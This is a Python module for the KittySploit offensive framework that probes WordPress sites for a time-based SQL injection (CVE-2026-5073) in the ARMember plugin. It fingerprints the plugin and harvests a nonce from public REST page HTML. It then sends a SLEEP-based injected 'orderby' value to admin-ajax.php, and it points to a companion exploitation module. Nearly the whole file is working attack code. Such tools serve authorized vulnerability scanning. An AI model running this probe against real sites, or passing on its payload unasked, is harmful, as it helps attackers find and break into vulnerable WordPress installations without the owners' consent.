#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ARMember Premium <= 7.3.1 directory paging SQLi (CVE-2026-5073)."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "armember-membership"


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "ARMember CVE-2026-5073 SQLi detect",
        "description": (
            "Time-based SQLi on arm_directory_paging_action orderby parameter "
            "(nonce from public REST pages HTML)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-5073",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-5073"],
        "modules": ["auxiliary/admin/http/armember_cve_2026_5073_sqli"],
        "tags": ["web", "scanner", "wordpress", "armember", "sqli", "cve-2026-5073"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/armember_cve_2026_5073_sqli"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(6, "SLEEP duration", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _nonce(self) -> str:
        rest = self.http_request(
            method="GET",
            path=self._join("/index.php"),
            params={"rest_route": "/wp/v2/pages", "per_page": "100"},
            allow_redirects=False,
        )
        if not rest:
            return ""
        m = re.search(r"name='arm_wp_nonce'[^>]*value='([a-f0-9]+)'", rest.text or "")
        return m.group(1) if m else ""

    def _timed(self, orderby: str, nonce: str) -> float:
        start = time.monotonic()
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "arm_directory_paging_action",
                "pagination": "infinite",
                "id": "1",
                "type": "directory",
                "orderby": orderby,
                "order": "ASC",
                "per_page": "10",
                "current_page": "1",
                "arm_wp_nonce": nonce,
            },
            allow_redirects=False,
            timeout=25,
        )
        return time.monotonic() - start

    def run(self):
        readme = self.http_request(
            method="GET",
            path=self._join(f"/wp-content/plugins/{_PLUGIN}/readme.txt"),
            allow_redirects=False,
        )
        if not readme or "ARMember" not in (readme.text or ""):
            return False
        nonce = self._nonce()
        if not nonce:
            return False
        sleep_s = int(self.sleep_seconds or 6)
        base_t = self._timed("display_name", nonce)
        inj = f"display_name,IF(1=1,SLEEP({sleep_s}),0)"
        delayed = self._timed(inj, nonce)
        if delayed >= sleep_s - 1 and delayed > base_t + (sleep_s - 2):
            self.set_info(
                severity="critical",
                reason="ARMember arm_directory_paging_action SQLi",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-5073",
            )
            return True
        return False
